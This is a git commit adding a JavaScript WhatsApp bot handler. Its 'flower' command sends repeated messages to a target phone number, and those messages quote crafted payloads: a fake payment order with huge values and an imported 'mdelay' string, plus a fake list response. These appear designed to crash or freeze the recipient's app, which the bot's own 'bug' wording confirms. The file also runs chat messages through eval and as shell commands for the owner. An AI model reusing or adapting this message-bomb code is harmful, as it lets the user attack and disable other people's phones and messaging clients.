a51a18f358c9fa49fdfc4b023d922975191973ad
VaniaaaSensei <142912153+VaniaaaSensei@users.noreply.github.com>
2024-05-19 18:45:31 +0700

    Add files via upload

---
+++ case.js
@@ -0,0 +1,212 @@
+/*
+   * Base Simpel
+   * Created By Fizzxy Production 
+*/
+
+require("./config")
+const fs = require('fs')
+const util = require('util')
+const axios = require('axios')
+const { exec } = require("child_process")
+
+module.exports = async (ptz, m) => {
+try {
+const body = (
+(m.mtype === 'conversation' && m.message.conversation) ||
+(m.mtype === 'imageMessage' && m.message.imageMessage.caption) ||
+(m.mtype === 'documentMessage' && m.message.documentMessage.caption) ||
+(m.mtype === 'videoMessage' && m.message.videoMessage.caption) ||
+(m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage.text) ||
+(m.mtype === 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ||
+(m.mtype === 'templateButtonReplyMessage' && m.message.templateButtonReplyMessage.selectedId)
+) ? (
+(m.mtype === 'conversation' && m.message.conversation) ||
+(m.mtype === 'imageMessage' && m.message.imageMessage.caption) ||
+(m.mtype === 'documentMessage' && m.message.documentMessage.caption) ||
+(m.mtype === 'videoMessage' && m.message.videoMessage.caption) ||
+(m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage.text) ||
+(m.mtype === 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ||
+(m.mtype === 'templateButtonReplyMessage' && m.message.templateButtonReplyMessage.selectedId)
+) : '';
+
+const budy = (typeof m.text === 'string') ? m.text : '';
+const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
+const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
+const isCmd = body.startsWith(prefix);
+const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
+const args = body.trim().split(/ +/).slice(1)
+const text = q = args.join(" ")
+const sender = m.key.fromMe ? (ptz.user.id.split(':')[0]+'@s.whatsapp.net' || ptz.user.id) : (m.key.participant || m.key.remoteJid)
+const botNumber = await ptz.decodeJid(ptz.user.id)
+const senderNumber = sender.split('@')[0]
+const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
+const pushname = m.pushName || `${senderNumber}`
+const isBot = botNumber.includes(senderNumber)
+
+const { mdelay } = require('./mdelay')
+const mengkece = fs.readFileSync('./mengkece.jpg')
+
+// Push Message To Console && Auto Read
+        if (m.message) {
+            ptz.readMessages([m.key])
+            console.log(chalk.cyan(`> ===================================================== <`) + '\n\n' + '\n' + chalk.black(chalk.bgCyan('🟢 ──〔 PESAN 〕──')), chalk.black(chalk.bgGreen(`Menerima pesan pada jam ${hours}🕒`)) + '\n' + chalk.black(chalk.bgWhite(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
+            }
+            const flower = {
+key: {
+remoteJid: 'status@broadcast',
+fromMe: false,
+participant: '0@s.whatsapp.net'
+},
+'message': {
+"interactiveMessage": {
+"header": {
+"hasMediaAttachment": true,
+"jpegThumbnail": global.jpegT
+},
+"nativeFlowMessage": {
+"buttons": [
+{
+"name": "review_and_pay",
+"buttonParamsJson": `{\"currency\":\"IDR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${unic.n7}${mdelay}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${mdelay}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
+}
+]
+}
+}
+}
+};
+
+//qbug
+const qbug = {
+key: {
+remoteJid: 'status@broadcast',
+fromMe: false, 
+participant: '0@s.whatsapp.net'
+},
+message: {
+listResponseMessage: {
+title: ` pois0n - Bot `
+}
+}
+}
+
+const qgeneral = {
+key: {
+remoteJid: 'status@broadcast',
+fromMe: false,
+participant: '0@s.whatsapp.net'
+},
+message: {
+newsletterAdminInviteMessage: {
+newsletterJid: `120363224727390375@newsletter`,
+newsletterName: `🔥`,
+jpegThumbnail: mengkece,
+caption: ` Pois0n - Bug ? \n ${m.body || m.mtype} `,
+inviteExpiration: Date.now() + 1814400000
+}
+}
+}
+
+
+const msgreply = async (teks) => {
+return ptz.sendMessage(m.chat, {
+contextInfo: {
+mentionedJid: [m.sender],
+externalAdReply: {
+showAdAttribution: true,
+renderLargerThumbnail: false,
+title: anuwm,
+body: null,
+previewType: "VIDEO",
+thumbnail: mengkece,
+sourceUrl: `wa.me/settings`,
+mediaUrl: `wa.me/settings`
+}
+},
+text: teks
+}, {
+quoted: qgeneral
+});
+}
+switch(command) {
+case 'flower': {
+if (!isCreator) throw "Lu mau gua bug?"
+if (!text) return msgreply(`Example: ${prefix + command} 62xxxx`);
+msgreply('Jangan lupa jeda yah')
+target = q.split("|")[0]+"@s.whatsapp.net"
+jumlah = 15
+for (let i = 0; i < jumlah; i++) {
+ptz.sendMessage(target, {text: ``,}, { quoted: qbug })
+ptz.sendMessage(target, {text: ``,}, { quoted: flower })
+}
+}
+break
+case "menu": case "help": case "tes":{
+m.reply(`
+halo kak ${pushname}, ini adalah base bot, jadi fiturnya dikit.
+
+> Menu
+> .ai
+> .flower 628xx
+
+`)
+}
+break
+case "ai":{
+if (!text) return m.reply("Mau nanya apa sama ai")
+let {data} = await axios.get("https://itzpire.site/ai/gpt-web?q=" + text); // api miftah api ku mati soalnya :v
+m.reply(data.result);
+}
+break
+default:
+if (budy.startsWith('=>')) {
+if (!isCreator) return
+function Return(sul) {
+sat = JSON.stringify(sul, null, 2)
+bang = util.format(sat)
+if (sat == undefined) {
+bang = util.format(sul)
+}
+return m.reply(bang)
+}
+try {
+m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
+} catch (e) {
+m.reply(String(e))
+}
+}
+
+if (budy.startsWith('>')) {
+if (!isCreator) return
+let kode = budy.trim().split(/ +/)[0]
+let teks
+try {
+teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
+} catch (e) {
+teks = e
+} finally {
+await m.reply(require('util').format(teks))
+}
+}
+
+if (budy.startsWith('$')) {
+if (!isCreator) return
+exec(budy.slice(2), (err, stdout) => {
+if (err) return m.reply(`${err}`)
+if (stdout) return m.reply(stdout)
+})
+}
+}
+
+} catch (err) {
+console.log(util.format(err))
+}
+}
+
+
+let file = require.resolve(__filename)
+fs.watchFile(file, () => {
+fs.unwatchFile(file)
+console.log(`Update ${__filename}`)
+delete require.cache[file]
+require(file)
+})
